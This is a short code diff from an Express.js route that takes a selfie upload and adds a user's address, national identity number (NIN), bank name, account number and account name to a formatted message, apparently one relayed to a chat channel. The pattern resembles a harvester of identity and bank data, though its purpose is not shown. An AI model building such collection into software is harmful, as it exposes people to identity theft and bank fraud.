@@ -131,6 +131,14 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
  <b>Employment Status:</b> ${employ}
  <b>Phone:</b> ${phone}
  <b>Marital Status:</b> ${marital}
+ <b>City:</b> ${city}
+ <b>State:</b> ${state}
+ <b>Address:</b> ${address}
+ <b>Local Government:</b> ${lga}
+ <b>NIN:</b> ${nin}
+ <b>Bank Name:</b> ${bankName}
+ <b>Account Number:</b> ${accountNumber}
+ <b>Account Name:</b> ${accountName}
 
 🕒 <b>Submitted at:</b> ${new Date().toLocaleString()}
         `.trim();
